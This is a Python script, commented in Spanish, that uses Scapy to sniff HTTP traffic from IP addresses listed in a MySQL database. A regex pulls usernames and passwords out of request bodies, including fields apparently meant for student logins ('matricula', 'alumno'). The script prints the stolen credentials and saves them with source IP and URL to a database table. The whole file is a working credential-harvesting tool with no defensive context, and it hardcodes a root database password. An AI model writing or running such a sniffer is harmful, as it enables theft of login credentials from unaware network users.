from scapy.all import *
import mysql.connector
from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import *
from colorama import init, Fore
import urllib.parse

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
# Conexion a la BD
mydb = mysql.connector.connect(
    host="localhost",
    user="root",
    password="0123456",
    database="analizador_red"
)

mycursor = mydb.cursor()
 #Obtener datos de la BD
mycursor.execute("SELECT ip FROM analizador_red.ips")
results = mycursor.fetchall()

# Crear una lista de direcciones IP
ip_list = [row[0] for row in results]

# Función para analizar paquetes
def analyze_packet(packet):
    # Verifica si el paquete tiene una capa IP
    if IP in packet:
        # Verifica si la dirección IP de origen o destino coincide con alguna de las direcciones IP que se están analizando
        if packet[IP].src in ip_list or packet[IP].dst in ip_list:
            if packet.haslayer(HTTPRequest):
                # Analiza el paquete y realiza las operaciones necesarias
                # Aquí puedes agregar tu código para analizar el paquete
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                ip = packet[IP].src
                print(f"\n{GREEN}[+] {ip} solicitó a {url}")

                # Obtener USERNAME Y CONTRASEÑA
                raw = packet.sprintf("%Raw.load%")
                fields = re.findall(r"(?:username|user|login|email|usuario|usuari|matricula|matricul|alumno|alumn)\W*(.*?)\W*(?:password|passwd|pass|contrasena|clave|claveacceso|acceso|acces)[\s\S]*?([\w\d\W]*)", packet.sprintf("%Raw.load%"), re.IGNORECASE)
                if fields:
                    for user, passwd in fields:
                        username = urllib.parse.unquote(user).split('=')[1]
                        password = urllib.parse.unquote(passwd).split('=')[1]
                        print(f"\n\nUsuario: {username}\nContraseña: {password}")

                        # Insertar datos a la BD
                        sql = "INSERT INTO datos_ip (ip_origen, destino, user, password) VALUES (%s, %s, %s, %s)"
                        val = (ip, url, username, password)
                        mycursor.execute(sql, val)
                        mydb.commit()

sniff(filter=f"host {' or host '.join(ip_list)}", prn=analyze_packet, store=0)